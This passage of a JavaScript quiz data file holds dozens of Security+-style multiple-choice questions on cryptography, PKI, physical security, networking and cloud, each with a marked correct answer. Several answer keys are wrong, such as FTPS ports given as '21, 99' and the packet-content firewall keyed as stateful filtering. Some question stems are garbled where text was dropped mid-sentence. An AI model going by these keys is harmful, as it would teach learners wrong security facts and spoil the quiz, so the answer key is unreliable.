      incorrectAnswers: [
        "They provide greater security.",
        "They are resistant to bypass attempts.",
        "They are harder to pick.",
      ],
      correctAnswer: "They do not require power.",
    },
    {
      question:
        "Kara has been asked to include IP schema management as part of her configuration management efforts. Which of the following is a security advantage of IP schema configuration management?",
      incorrectAnswers: [
        "Using IP addresses to secure encryption keys",
        "Preventing denial-of-service attacks",
        "Avoiding IP address exhaustion",
      ],
      correctAnswer: "Detecting rogue devices",
    },
    {
      question:
        "Carole is concerned about security for her server room. She wants the most secure lock she can find for the server room door. Which of the following would be the best choice for her?",
      incorrectAnswers: ["Combination lock", "Key-in-knob", "Padlock"],
      correctAnswer: "Deadbolt",
    },
    {
      question:
        "Melissa wants to implement NIC teaming for a server in her datacenter. What two major capabilities will this provide for her?",
      incorrectAnswers: [
        "Lower latency and greater throughput",
        "Higher latency and fault tolerance",
        "Fault tolerance and lower latency",
      ],
      correctAnswer: "Greater throughput and fault tolerance",
    },
    {
      question:
        "Molly is implementing biometrics in her company. Which of the following should be her biggest concern?",
      incorrectAnswers: ["FRR", "CER", "EER"],
      correctAnswer: "FAR",
    },
    {
      question:
        "Mike is concerned about data sovereignty for data that his organization captures and maintains. What best describes his concern?",
      incorrectAnswers: [
        "Who owns the data that is captured on systems hosted in a cloud provider's infrastructure?",
        "Can Mike's organization make decisions about data that is part of its service, or does it belong to users?",
        "Does data have rights on its own, or does the owner of the data determine what rights may apply to it?",
      ],
      correctAnswer:
        "Is the data located in a country subject to the laws of the country where it is stored?",
    },
    {
      question:
        "What are the key limiting factors for cryptography on low-power devices?",
      incorrectAnswers: [
        "The devices cannot support public key encryption due to an inability to factor prime numbers.",
        "There is a lack of chipset support for encryption.",
        "Legal limitations for low-power devices prevent encryption from being supported.",
      ],
      correctAnswer: "There are system limitations on memory, CPU, and storage.",
    },
    {
      question:
        "Fred is responsible for physical security in his company. He wants to find a good way to protect the USB thumb drives that have BitLocker keys stored on them. Which of the following would be the best solution for this situation?",
      incorrectAnswers: [
        "Encrypt the thumb drives.",
        "Don't store BitLocker keys on these drives.",
        "Lock the thumb drives in desk drawers.",
      ],
      correctAnswer: "Store the drives in a secure cabinet or safe.",
    },
    {
      question:
        "Juanita is responsible for servers in her company. She is looking for a fault-tolerant solution that can handle two drives failing. Which of the following should she select?",
      incorrectAnswers: ["RAID 3", "RAID", "RAID 5"],
      correctAnswer: "RAID 6",
    },
    {
      question:
        "Maria's organization uses a CCTV monitoring system in their main office building, which is occupied and in use 24-7. The system uses cameras connected to displays to provide real-time monitoring. What additional feature is the most likely to receive requests to ensure that her organization can effectively use the CCTV system to respond to theft and other issues?",
      incorrectAnswers: [
        "Motion activation",
        "Infrared cameras",
        "Facial recognition",
      ],
      correctAnswer: "DVR",
    },
    {
      question:
        "What is the primary threat model against static codes used for multifactor authentication?",
      incorrectAnswers: ["Brute force", "Collisions", "Clock mismatch"],
      correctAnswer: "Theft",
    },
    {
      question:
        "Dennis needs a cryptographic algorithm that provides low latency. What type of cryptosystem is most likely to meet this performance requirement?",
      incorrectAnswers: [
        "Hashing",
        "Asymmetric encryption",
        "Electronic one-time pad",
      ],
      correctAnswer: "Symmetric encryption",
    },
    {
      question:
        "The company that Devin works for has selected a nondescript building and does not use exterior signage to advertise that the facility belongs to them. What physical security term describes this type of security control?",
      incorrectAnswers: [
        "Demilitarized zone",
        "Industrial obfuscation",
        "Disruptive coloration",
      ],
      correctAnswer: "Industrial camouflage",
    },
    {
      question:
        "Ed knows that TLS sessions start using asymmetric encryption, and then move to use symmetric keys. What limitation of asymmetric cryptography drives this design decision?",
      incorrectAnswers: [
        "Key length limitations",
        "Lifespan (time) to brute force it",
        "Key reuse for asymmetric algorithms",
      ],
      correctAnswer: "Speed and computational overhead",
    },
    {
      question:
        "When you are concerned about application security, what is the most important issue in memory management?",
      incorrectAnswers: [
        "Never allocate a variable any larger than is needed.",
        "Always check bounds on arrays.",
        "Always declare a variable where you need it (i.e., at function or file level if possible).",
      ],
      correctAnswer: "Make sure you release any memory you allocate.",
    },
    {
      question:
        "Bart wants to ensure that the files he encrypts remain secure for as long as possible. What should Bart do to maximize the longevity of his encrypted file's security?",
      incorrectAnswers: [
        "Use a quantum cipher.",
        "Use an anti-quantum cipher.",
        "Use a rotating symmetric key.",
      ],
      correctAnswer: "Use the longest key possible.",
    },
    {
      question:
        "Nadine's organization stores and uses sensitive information, including Social Security numbers. After a recent compromise, she has been asked to implement technology that can help prevent this sensitive data from leaving the company's systems and networks. What type of technology should Nadine implement?",
      incorrectAnswers: ["Stateful firewalls", "OEM", "SIEM"],
      correctAnswer: "DLP",
    },
    {
      question:
        "What form is the data used for quantum key distribution sent in?",
      incorrectAnswers: ["Bytes", "Bits", "Nuquants"],
      correctAnswer: "Qubits",
    },
    {
      question:
        "Alicia needs to ensure that a process cannot be subverted by a single employee. What security control can she implement to prevent this?",
      incorrectAnswers: ["Biometric authentication", "Robotic sentries", "A DMZ"],
      correctAnswer: "Two-person control",
    },
    {
      question:
        "Social login, the ability to use an existing identity from a site like Google, Facebook, or a Microsoft account, is an example of which of the following concepts?",
      incorrectAnswers: [
        "AAA",
        "Privilege creep",
        "Identity and access management",
      ],
      correctAnswer: "Federation",
    },
    {
      question:
        "Michelle is traveling and wants to plug her phone into the charger in her hotel room. What security precaution can she use to ensure that her phone is not attacked by a malicious device built into the charger in her room?",
      incorrectAnswers: [
        "A parallel USB cable",
        "A data circuit breaker",
        "An HOTP interrogator",
      ],
      correctAnswer: "A USB data blocker",
    },
    {
      question:
        "Which cloud service model provides the consumer with the infrastructure to create applications and host them?",
      incorrectAnswers: ["SaaS", "IaaS", "IDaaS"],
      correctAnswer: "PaaS",
    },
    {
      question:
        "Why is avoiding initialization vector and key reuse recommended to ensure secure encryption?",
      incorrectAnswers: [
        "It makes it impossible to brute force.",
        "It means a single successful attack will not expose any messages.",
        "It makes brute force easier.",
      ],
      correctAnswer:
        "It means a single successful attack will not expose multiple messages.",
    },
    {
      question:
        "Dan knows that his Linux system generates entropy that is used for multiple functions, including encryption. Which of the following is a source of entropy for the Linux kernel?",
      incorrectAnswers: [
        "Time of day",
        "User login events",
        "Network packet timing",
      ],
      correctAnswer: "Keystrokes and mouse movement",
    },
    {
      question:
        "Mike knows that computational overheads are a concern for cryptographic systems. What can he do to help limit the computational needs of his solution?",
      incorrectAnswers: [
        "Use hashes instead.",
        "Use short keys.",
        "Use the RSA algorithm.",
      ],
      correctAnswer: "Use elliptic curve encryption.",
    },
    {
      question:
        "What is the primary role of lighting in a physical security environment?",
      incorrectAnswers: [
        "It acts as a detective control.",
        "It acts as a reactive control.",
        "It acts as a compensating control.",
      ],
      correctAnswer: "It acts as a deterrent control.",
    },
    {
      question:
        "Dennis has deployed servers and storage to each of the facilities his organization runs to ensure that scientific equipment can send and receive data at the speed that it needs to function. What computational design concept describes this?",
      incorrectAnswers: ["Hybrid cloud", "Mist computing", "Local cloud"],
      correctAnswer: "Edge computing",
    },
    {
      question:
        "Ben replaces sensitive data in his database with unique identifiers. The identifiers allow him to continue to take actions on the data without exposing the data itself. What type of solution has he deployed?",
      incorrectAnswers: ["Masking", "Encryption", "Hashing"],
      correctAnswer: "Tokenization",
    },
    {
      question:
        "Dana wants to discourage potential malicious actors from accessing her facility. Which of the following is both a deterrent and a physical control?",
      incorrectAnswers: [
        "A visitor log",
        "A motion detector",
        "A security camera",
      ],
      correctAnswer: "Fences",
    },
    {
      question:
        "What additional capabilities does adding a digital signature to an encrypted message provide?",
      incorrectAnswers: [
        "Confidentiality and integrity",
        "Availability and nonrepudiation",
        "Confidentiality and availability",
      ],
      correctAnswer: "Integrity and nonrepudiation",
    },
    {
      question:
        "Megan has been asked to set up a periodic attestation process for accounts in her organization. What has she been asked to do?",
      incorrectAnswers: [
        "Validate that the users are still employed.",
        "Require users to provide proof of identity.",
        "Validate security controls as part of a test.",
      ],
      correctAnswer:
        "Validate that the user's rights and permissions are still correct.",
    },
    {
      question:
        "Elaine wants to adopt appropriate response and recovery controls for natural disasters. What type of control should she use to prepare for a multihour power outage caused by a tornado?",
      incorrectAnswers: ["A hot site", "A PDU", "A UPS"],
      correctAnswer: "A generator",
    },
    {
      question:
        "What does a message authentication code (MAC) do when used as part of a cryptographic system?",
      incorrectAnswers: [
        "It validates the message's confidentiality and authenticity.",
        "It protects the message's confidentiality and integrity.",
        "None of the above",
      ],
      correctAnswer: "It validates the message's integrity and authenticity.",
    },
    {
      question:
        "Charles wants to put a fire suppression system in place in an area where highly sensitive electronics are in use. What type of fire suppression system is best suited to this type of environment if Charles is concerned about potential harm to first responders or on-site staff?",
      incorrectAnswers: ["Pre-charge", "Dry pipe", "Carbon dioxide"],
      correctAnswer: "Inert gas",
    },
    {
      question: "What technology is typically used for proximity card readers?",
      incorrectAnswers: ["Magnetic stripe", "Biometrics", "Infrared"],
      correctAnswer: "RFID",
    },
    {
      question: "How does asymmetric encryption support nonrepudiation?",
      incorrectAnswers: [
        "Using longer keys",
        "Using reversible hashes",
        "Using the recipient's public key",
      ],
      correctAnswer: "Using digital signatures",
    },
    {
      question:
        "Olivia knows that she needs to consider geography as part of her security considerations. Which of the following is a primary driver of geographical considerations for security?",
      incorrectAnswers: ["MTR", "Service integration", "Sprawl avoidance"],
      correctAnswer: "Natural disasters",
    },
    {
      question:
        "Scott wants to limit the impact of potential threats from UAVs. What physical security control is best suited to this purpose?",
      incorrectAnswers: [
        "Adding more fences",
        "Deploying biometric sensors",
        "Moving sensitive areas to Faraday cages",
      ],
      correctAnswer: "Moving sensitive areas to the interior of a building",
    },
    {
      question:
        "Derek wants to explain the concept of resource constraints driving security constraints when using encryption. Which of the following descriptions best explains the trade-offs that he should explain to his management?",
      incorrectAnswers: [
        "Stronger encryption requires more space on drives, meaning that the harder it is to break, the more storage you'll need, driving up cost.",
        "Stronger encryption is faster, which means that using strong encryption will result in lower latency.",
        "Stronger encryption requires more entropy. This may reduce the overall security of the system when entropy is exhausted.",
      ],
      correctAnswer:
        "Stronger encryption requires more computational resources, requiring a balance between speed and security.",
    },
    {
      question:
        "Amanda wants to ensure that the message she is sending remains confidential. What should she do to ensure this?",
      incorrectAnswers: [
        "Hash the messages.",
        "Digitally sign the message.",
        "Use a quantum encryption algorithm.",
      ],
      correctAnswer: "Encrypt the message.",
    },
    {
      question:
        "What security advantage do cloud service providers like Amazon, Google, and Microsoft have over local staff and systems for most small to mid-sized organizations?",
      incorrectAnswers: [
        "Better understanding of the organization's business practices",
        "Faster response times",
        "None of the above",
      ],
      correctAnswer: "More security staff and budget",
    },
    {
      question:
        "Tim wants to ensure that his web servers can scale horizontally during traffic increases, while also allowing them to be patched or upgraded without causing outages. What type of network device should he deploy?",
      incorrectAnswers: ["A firewall", "A switch", "A horizontal scaler"],
      correctAnswer: "A network load balancer",
    },
    {
      question:
        "Gabby wants to ensure that sensitive data can be transmitted in unencrypted form by using physical safeguards. What type of solution should she implement?",
      incorrectAnswers: [
        "Shielded cables",
        "Armored cables",
        "Distribution lockdown",
      ],
      correctAnswer: "Protected cable distribution",
    },
    {
      question:
        "Maureen conceals information she wants to transmit surreptitiously by modifying an MP3 file in a way that does not noticeably change how it sounds. What is this technique called?",
      incorrectAnswers: ["MP3crypt", "Audio hashing", "Honey MP3s"],
      correctAnswer: "Audio steganography",
    },
    {
      question:
        "Nicole is assessing risks to her multifactor authentication system. Which of the following is the most likely threat model against short message service (SMS) push notifications to cell phones for her environment?",
      incorrectAnswers: [
        "Attacks on VoIP systems",
        "Brute-force attacks",
        "Rainbow tables",
      ],
      correctAnswer: "SIM cloning",
    },
    {
      question:
        "John wants to protect data at rest so that he can process it and use it as needed in its original form. What solution from the following list is best suited to this requirement?",
      incorrectAnswers: ["Hashing", "TLS", "Tokenization"],
      correctAnswer: "Encryption",
    },
    {
      question:
        "Nathaniel has deployed the control infrastructure for his manufacturing plant without a network connection to his other networks. What term describes this type of configuration?",
      incorrectAnswers: ["DMZ", "Vaulting", "A hot aisle"],
      correctAnswer: "Air gap",
    },
    {
      question:
        "Naomi hides the original data in a Social Security number field to ensure that it is not exposed to users of her database. What data security technique does this describe?",
      incorrectAnswers: ["Encryption", "Hashing", "Tokenization"],
      correctAnswer: "Masking",
    },
    {
      question:
        "Isaac wants to use on-premises cloud computing. What term describes this type of cloud computing solution?",
      incorrectAnswers: [
        "Infrastructure as a service",
        "Hybrid cloud",
        "Platform as a service",
      ],
      correctAnswer: "Private cloud",
    },
    {
      question:
        "What is the primary threat model against physical tokens used for multifactor authentication?",
      incorrectAnswers: ["Cloning", "Brute force", "Algorithm failure"],
      correctAnswer: "Theft",
    },
    {
      question:
        "Maria is a security administrator for a large bank. She is concerned about malware, particularly spyware that could compromise customer datWhich of the following would be the best approach for her to mitigate the threat of spyware?",
      incorrectAnswers: [
        "Computer usage policies, network antimalware, and host antimalware",
        "Host antimalware and network antimalware",
        "Host and network antimalware, computer usage policies, and website whitelisting",
      ],
      correctAnswer:
        "Host and network antimalware, computer usage policies, and employee training",
    },
    {
      question:
        "Charles has configured his multifactor system to require both a PIN and a passworHow many effective factors does he have in place once he presents both of these and his username?",
      incorrectAnswers: ["Two", "Three", "Four"],
      correctAnswer: "One",
    },
    {
      question:
        "Fred adds the value 89EA443CCDA16B89 to every password as a salt. What issue might this cause?",
      incorrectAnswers: [
        "The salt is too long.",
        "The salt is alphanumeric.",
        "The salt is too short.",
      ],
      correctAnswer: "The salt is reused.",
    },
    {
      question:
        "Alaina needs to physically secure the root encryption keys for a certificate authority. What type of security device should she use to maintain local control and security for them?",
      incorrectAnswers: [
        "A USB thumb drive",
        "An air-gapped system",
        "None of the above",
      ],
      correctAnswer: "A vault or safe",
    },
    {
      question:
        "Angela wants to help her organization use APIs more securely and needs to select three API security best practices. Which of the following options is not a common API security best practice?",
      incorrectAnswers: [
        "Use encryption throughout the API's request/response cycle.",
        "Do not trust input strings and validate parameters.",
        "Enable auditing and logging.",
      ],
      correctAnswer: "Authorize before authenticating.",
    },
    {
      question:
        "Frank uses a powerful magnet to wipe tapes before they are removed from his organization's inventory. What type of secure data destruction technique has he used?",
      incorrectAnswers: ["Tape burning", "Data shredding", "Pulping"],
      correctAnswer: "Degaussing",
    },
    {
      question:
        "Angela has been asked to deploy 5G cellular inside her organization. What concern should she raise with her management about the effort to implement it?",
      incorrectAnswers: [
        "5G signals should only be used in exterior deployments.",
        "5G is not widely available and cannot be deployed yet.",
        "5G signals cannot coexist with traditional Wi-Fi.",
      ],
      correctAnswer:
        "5G requires high levels of antenna density for full coverage.",
    },
    {
      question:
        "Chris is reviewing the rights that staff in his organization have to data stored in a group of departmental file shares. He is concerned that rights management practices have not been followed and that employees who have been with the company he works for have not had their privileges removed after they switched jobs. What type of issue has Chris encountered?",
      incorrectAnswers: [
        "IAM inflation",
        "Masking issues",
        "Privilege escalation",
      ],
      correctAnswer: "Privilege creep",
    },
    {
      question:
        "Isaac has been asked to set up a honeyfile. What should he configure?",
      incorrectAnswers: [
        "A list of tasks to accomplish",
        "A list of potentially valuable data",
        "A vulnerable Word file",
      ],
      correctAnswer: "A bait file for attackers to access",
    },
    {
      question:
        "Yasmine wants to ensure that she has met a geographic dispersal requirement for her datacenters. How far away should she place her datacenter based on common best practices for dispersal?",
      incorrectAnswers: ["5 miles", "45 miles", "150 miles"],
      correctAnswer: "90 miles",
    },
    {
      question:
        "What term describes extending cloud computing to the edge of an enterprise network?",
      incorrectAnswers: ["Local cloud", "Managed cloud", "Blade computing"],
      correctAnswer: "Fog computing",
    },
    {
      question:
        "Which of the following algorithms is a key stretching algorithm?",
      incorrectAnswers: ["ncrypt", "MD5", "SHA1"],
      correctAnswer: "bcrypt",
    },
    {
      question:
        "Jocelyn has been asked to implement a directory service. Which of the following technologies should she deploy?",
      incorrectAnswers: ["SAML", "OAuth", "802.1x"],
      correctAnswer: "LDAP",
    },
  ];
  
  const sectionThree = [
    {
      question:
        "Adam is setting up a public key infrastructure (PKI) and knows that keeping the passphrases and encryption keys used to generate new keys is a critical part of how to ensure that the root certificate authority remains secure. Which of the following techniques is not a common solution to help prevent insider threats?",
      incorrectAnswers: [
        "Use a split knowledge process for the password or key.",
        "Require dual control.",
        "Implement separation of duties.",
      ],
      correctAnswer:
        "Require a new passphrase every time the certificate is used.",
    },
    {
      question:
        "Naomi is designing her organization's wireless network and wants to ensure that the design places access points in areas where they will provide optimum coverage. She also wants to plan for any sources of RF interference as part of her design. What should Naomi do first?",
      incorrectAnswers: [
        "Contact the FCC for a wireless map.",
        "Disable all existing access points.",
        "Conduct a port scan to find all existing access points.",
      ],
      correctAnswer: "Conduct a site survey.",
    },
    {
      question:
        "Chris is preparing to implement an 802.1X-enabled wireless infrastructure. He knows that he wants to use an Extensible Authentication Protocol (EAP)-based protocol that does not require client-side certificates. Which of the following options should he choose?",
      incorrectAnswers: ["EAP-MD5", "LEAP", "EAP-TLS"],
      correctAnswer: "PEAP",
    },
    {
      question:
        "What term is commonly used to describe lateral traffic movement within a network?",
      incorrectAnswers: ["Side-stepping", "Slider traffic", "Peer interconnect"],
      correctAnswer: "East-west traffic",
    },
    {
      question:
        "Charlene wants to use the security features built into HTTP headers. Which of the following is not an HTTP header security option?",
      incorrectAnswers: [
        "Requiring transport security",
        "Preventing cross-site scripting",
        "Helping prevent MIME sniffing",
      ],
      correctAnswer: "Disabling SQL injection",
    },
    {
      question:
        "Charlene wants to provision her organization's standard set of marketing information to mobile devices throughout her organization. What MDM feature is best suited to this task?",
      incorrectAnswers: [
        "Application management",
        "Remote wipe",
        "Push notifications",
      ],
      correctAnswer: "Content management",
    },
    {
      question:
        "Denny wants to deploy antivirus for his organization and wants to ensure that it will stop the most malware. What deployment model should Denny select?",
      incorrectAnswers: [
        "Install antivirus from the same vendor on individual PCs and servers to best balance visibility, support, and security.",
        "Install antivirus from more than one vendor on all PCs and servers to maximize coverage.",
        "Install antivirus only on workstations to avoid potential issues with server performance.",
      ],
      correctAnswer:
        "Install antivirus from one vendor on PCs and from another vendor on the server to provide a greater chance of catching malware.",
    },
    {
      question:
        "When Amanda visits her local coffee shop, she can connect to the open wireless without providing a password or logging in, but she is immediately redirected to a website that asks for her email address. Once she provides it, she is able to browse the Internet normally. What type of technology has Amanda encountered?",
      incorrectAnswers: [
        "A preshared key",
        "Port security",
        "A Wi-Fi protected access",
      ],
      correctAnswer: "A captive portal",
    },
    {
      question:
        "Charles has been asked to implement DNSSEC for his organization. Which of the following does it provide?",
      incorrectAnswers: ["Confidentiality", "Availability", "All of the above"],
      correctAnswer: "Integrity",
    },
    {
      question:
        "Sarah has implemented an OpenID-based authentication system that relies on existing Google accounts. What role does Google play in a federated environment like this?",
      incorrectAnswers: ["An RP", "An SP", "An RA"],
      correctAnswer: "An IdP",
    },
    {
      question:
        "Ian needs to connect to a system via an encrypted channel so that he can use a command-line shell. What protocol should he use?",
      incorrectAnswers: ["Telnet", "HTTPS", "TLS"],
      correctAnswer: "SSH",
    },
    {
      question:
        "Casey is considering implementing password key devices for her organization. She wants to use a broadly adopted open standard for authentication and needs her keys to support that. Which of the following standards should she look for her keys to implement, in addition to being able to connect via USB, Bluetooth, and NFC?",
      incorrectAnswers: ["SAML", "ARF", "OpenID"],
      correctAnswer: "FIDO",
    },
    {
      question:
        "Nadia is concerned about the content of her emails to her friend Danielle being read as they move between servers. What technology can she use to encrypt her emails, and whose key should she use to encrypt the message?",
      incorrectAnswers: [
        "S/MIME, her private key",
        "Secure POP3, her public key",
        "Secure POP3, Danielle's private key",
      ],
      correctAnswer: "S/MIME, Danielle's public key",
    },
    {
      question: "What type of communications is SRTP most likely to be used for?",
      incorrectAnswers: ["Email", "Web", "File transfer"],
      correctAnswer: "VoIP",
    },
    {
      question:
        "Olivia is implementing a load-balanced web application cluster. Her organization already has a redundant pair of load balancers, but each unit is not rated to handle the maximum designed throughput of the cluster by itself. Olivia has recommended that the load balancers be implemented in an active/active design. What concern should she raise as part of this recommendation?",
      incorrectAnswers: [
        "The load balancer cluster cannot be patched without a service outage.",
        "The load balancer cluster is vulnerable to a denial-of-service attack.",
        "None of the above",
      ],
      correctAnswer:
        "If one of the load balancers fails, it could lead to service degradation.",
    },
    {
      question: "What two ports are most commonly used for FTPS traffic?",
      incorrectAnswers: ["21, 22", "433, 1433", "20, 21"],
      correctAnswer: "21, 99",
    },
    {
      question: "What occurs when a certificate is stapled?",
      incorrectAnswers: [
        "The certificate is stored in a secured location that prevents the certificate from being easily removed or modified.",
        "Both the host certificate and the root certificate authority's private key are attached to validate the authenticity of the chain.",
        "The certificate is attached to other certificates to demonstrate the entire certificate chain.",
      ],
      correctAnswer:
        "Both the certificate and OCSP responder are sent together to prevent additional retrievals during certificate path validation.",
    },
    {
      question:
        "Greg is setting up a public key infrastructure (PKI). He creates an offline root certificate authority (CA) and then needs to issue certificates to users and devices. What system or device in a PKI receives certificate signing requests (CSRs) from applications, systems, and users?",
      incorrectAnswers: ["An intermedia CA", "A CRL", "None of the above"],
      correctAnswer: "An RA",
    },
    {
      question:
        "Mark is responsible for managing his company's load balancer and wants to use a loadbalancing scheduling technique that will take into account the current server load and active sessions. Which of the following techniques should he choose?",
      incorrectAnswers: [
        "Source IP hashing",
        "Weighted response time",
        "Round robin",
      ],
      correctAnswer: "Least connection",
    },
    {
      question:
        "During a security review, Matt notices that the vendor he is working with lists their IPSec virtual private network (VPN) as using AH protocol for security of the packets that it sends. What concern should Matt note to his team about this?",
      incorrectAnswers: [
        "AH does not provide data integrity.",
        "AH does not provide replay protection.",
        "None of the above; AH provides confidentiality, authentication, and replay protection.",
      ],
      correctAnswer: "AH does not provide confidentiality.",
    },
    {
      question:
        "Michelle wants to secure mail being retrieved via the Post Office Protocol Version 3 (POP3) because she knows that it is unencrypted by default. What is her best option to do this while leaving POP3 running on its default port?",
      incorrectAnswers: [
        "Use TLS via port 25.",
        "Use IKE via port 25.",
        "Use IKE via port 110.",
      ],
      correctAnswer: "Use TLS via port 110.",
    },
    {
      question:
        "Daniel works for a mid-sized financial institution. The company has recently moved some of its data to a cloud solution. Daniel is concerned that the cloud provider may not support the same security policies as the company's internal network. What is the best way to mitigate this concern?",
      incorrectAnswers: [
        "Perform integration testing.",
        "Establish cloud security policies.",
        "Implement security as a service.",
      ],
      correctAnswer: "Implement a cloud access security broker.",
    },
    {
      question:
        "The company that Angela works for has deployed a Voice over IP (VoIP) environment that uses SIP. What threat is the most likely issue for their phone calls?",
      incorrectAnswers: ["Vishing", "War dialing", "Denial-of-service attacks"],
      correctAnswer: "Call interception",
    },
    {
      question:
        "Alaina is concerned about the security of her NTP time synchronization service because she knows that protocols like TLS and BGP are susceptible to problems if fake NTP messages were able to cause time mismatches between systems. What tool could she use to quickly protect her NTP traffic between Linux systems?",
      incorrectAnswers: ["An IPSec VPN", "RDP", "A TLS VPN"],
      correctAnswer: "SSH tunneling",
    },
    {
      question:
        "Katie's organization uses File Transfer Protocol (FTP) for contractors to submit their work product to her organization. The contractors work on sensitive customer information, and then use organizational credentials provided by Katie's company to log in and transfer the information. What sensitive information could attackers gather if they were able to capture the network traffic involved in this transfer?",
      incorrectAnswers: [
        "Nothing, because FTP is a secure protocol",
        "IP addresses for both client and server",
        "The content of the files that were uploaded",
      ],
      correctAnswer: "Usernames, passwords, and file content",
    },
    {
      question:
        "What security benefits are provided by enabling DHCP snooping or DHCP sniffing on switches in your network?",
      incorrectAnswers: [
        "Prevention of malicious or malformed DHCP traffic",
        "Prevention of rogue DHCP servers",
        "Collection of information about DHCP bindings",
      ],
      correctAnswer: "All of the above",
    },
    {
      question:
        "Aaron wants to use a certificate for the following production hosts www.example.com, blog.example.com, news.example.com . What is the most efficient way for him to provide Transport Layer Security (TLS) for all of these systems?",
      incorrectAnswers: [
        "Use self-signed certificates.",
        "Use an EV certificate.",
        "Use an SSL certificate.",
      ],
      correctAnswer: "Use a wildcard certificate.",
    },
    {
      question:
        "Cassandra is concerned about attacks against her network's Spanning Tree Protocol (STP). She wants to ensure that a new switch introduced by an attacker cannot change the topology by asserting a lower bridge ID than the current configuration. What should she implement to prevent this?",
      incorrectAnswers: [
        "Enable BridgeProtect.",
        "Set the bridge ID to a negative number.",
        "Disable Spanning Tree protocol.",
      ],
      correctAnswer: "Enable Root Guard.",
    },
    {
      question:
        "Charles finds a PFX formatted file on the system he is reviewing. What is a PFX file capable of containing?",
      incorrectAnswers: [
        "Only certificates and chain certificates, not private keys",
        "Only a private key",
        "None of the above, because PFX files are used for certificate requests only",
      ],
      correctAnswer:
        "A server certificate, intermediate certificates, and the private key",
    },
    {
      question:
        "Ted wants to use IP reputation information to protect his network and knows that third parties provide that information. How can he get this data, and what secure protocol is he most likely to use to retrieve it?",
      incorrectAnswers: [
        "A subscription service, SAML",
        "A VDI, XML",
        "An FDE, XML",
      ],
      correctAnswer: "A subscription service, HTTPS",
    },
    {
      question:
        "What does setting the secure attribute for an HTTP cookie result in?",
      incorrectAnswers: [
        "Cookies will be stored in encrypted form.",
        "Cookies will be stored in hashed form.",
        "Cookies must be accessed using a cookie key.",
      ],
      correctAnswer: "Cookies will be sent only over HTTPS.",
    },
    {
      question:
        "Charles wants to use IPSec and needs to be able to determine the IPSec policy for traffic based on the port it is being sent to on the remote system. Which IPSec mode should he use?",
      incorrectAnswers: ["IPSec tunnel mode", "IPSec IKE mode", "IPSec PSK mode"],
      correctAnswer: "IPSec transport mode",
    },
    {
      question:
        "Wi-Fi Protected Setup (WPS) includes four modes for adding devices to a network. Which mode has significant security concerns due to a brute-force exploit?",
      incorrectAnswers: ["USB", "Push button", "Near-field communication"],
      correctAnswer: "PIN",
    },
    {
      question:
        "Claire wants to check whether a certificate has been revokeWhat protocol is used to validate certificates?",
      incorrectAnswers: ["RTCP", "CRBL", "PKCRL"],
      correctAnswer: "OCSP",
    },
    {
      question:
        "Nick is responsible for cryptographic keys in his company. What is the best way to deauthorize a public key?",
      incorrectAnswers: [
        "Send out a network alert.",
        "Delete the digital certificate.",
        "Notify the RA.",
      ],
      correctAnswer: "Publish that certificate in the CRL.",
    },
    {
      question:
        "What two connection methods are used for most geofencing applications?",
      incorrectAnswers: [
        "Cellular and GPS",
        "USB and Bluetooth",
        "Cellular and Bluetooth",
      ],
      correctAnswer: "GPS and Wi-Fi",
    },
    {
      question:
        "Gabriel is setting up a new e-commerce server. He is concerned about security issues. Which of the following would be the best location to place an e-commerce server?",
      incorrectAnswers: ["Intranet", "Guest network", "Extranet"],
      correctAnswer: "DMZ",
    },
    {
      question:
        "Janelle is the security administrator for a small company. She is trying to improve security throughout the network. Which of the following steps should she take first?",
      incorrectAnswers: [
        "Implement antimalware on all computers.",
        "Implement acceptable use policies.",
        "Set password reuse policies.",
      ],
      correctAnswer: "Turn off unneeded services on all computers.",
    },
    {
      question:
        "Ben is responsible for a new application with a worldwide user base that will allow users to sign up to access existing data about them. He would like to use a method of authentication that will permit him to verify that users are the correct people to match up with their accounts. How can he validate these users?",
      incorrectAnswers: [
        "Require that they present their Social Security number.",
        "Require them to use a federated identity via Google.",
        "Require them to validate an email sent to the account they signed up with.",
      ],
      correctAnswer: "Require them to use knowledge-based authentication.",
    },
    {
      question:
        "Jason wants to implement a remote access virtual private network (VPN) for users in his organization who primarily rely on hosted web applications. What common VPN type is best suited to this if he wants to avoid deploying client software to his end-user systems?",
      incorrectAnswers: [
        "An RDP (Remote Desktop Protocol) VPN",
        "An Internet Control Message Protocol (ICMP) VPN",
        "An IPSec VPN",
      ],
      correctAnswer: "A TLS VPN",
    },
    {
      question:
        "Juan is a network administrator for an insurance company. His company has a number of traveling salespeople. He is concerned about confidential data on their laptops. What is the best way for him to address this?",
      incorrectAnswers: ["TPM", "SDN", "DMZ"],
      correctAnswer: "FDE",
    },
    {
      question:
        "Which design concept limits access to systems from outside users while protecting users and systems inside the LAN?",
      incorrectAnswers: ["VLAN", "Router", "Guest network"],
      correctAnswer: "DMZ",
    },
    {
      question:
        "Nina wants to use information about her users like their birth dates, addresses, and job titles as part of her identity management system. What term is used to describe this type of information?",
      incorrectAnswers: ["Roles", "Factors", "Identifiers"],
      correctAnswer: "Attributes",
    },
    {
      question:
        "Megan is preparing a certificate signing request (CSR) and knows that she needs to provide a CN for her web server. What information will she put into the CN field for the CSR?",
      incorrectAnswers: ["Her name", "The hostname", "The company's name"],
      correctAnswer: "The fully qualified domain name of the system",
    },
    {
      question:
        "Which of the following is the equivalent of a VLAN from a physical security perspective?",
      incorrectAnswers: ["Perimeter security", "Security zones", "Firewall"],
      correctAnswer: "Partitioning",
    },
    {
      question:
        "Nelson uses a tool that lists the specific applications that can be installed and run on a system. The tool uses hashes of the application's binary to identify each application to ensure that the application matches the filename provided for it. What type of tool is Nelson using?",
      incorrectAnswers: ["Antivirus", "Blacklisting", "Antimalware"],
      correctAnswer: "Whitelisting",
    },
    {
      question:
        "Which type of firewall examines the content and context of each packet it encounters?",
      incorrectAnswers: [
        "Packet filtering firewall",
        "Application layer firewall",
        "Gateway firewall",
      ],
      correctAnswer: "Stateful packet filtering firewall",
    },
    {
      question:
        "As part of his wireless network deployment efforts, Scott generates the image shown here. What term is used to describe this type of visualization of wireless networks?",
      incorrectAnswers: ["A network diagram", "A zone map", "A DMZ"],
      correctAnswer: "A heatmap",
    },
    {
      question:
        "You're designing a new network infrastructure so that your company can allow unauthenticated users connecting from the Internet to access certain areas. Your goal is to protect the internal network while providing access to those areas. You decide to put the web server on a separate subnet open to public contact. What is this subnet called?",
      incorrectAnswers: ["Guest network", "Intranet", "VLAN"],
      correctAnswer: "DMZ",
    },
    {
      question:
        "Madhuri's web application converts numbers that are input into fields by specifically typing them and then applies strict exception handling. It also sets a minimum and maximum length for the inputs that it allows and uses predefined arrays of allowed values for inputs like months or dates. What term describes the actions that Madhuri's application is performing?",
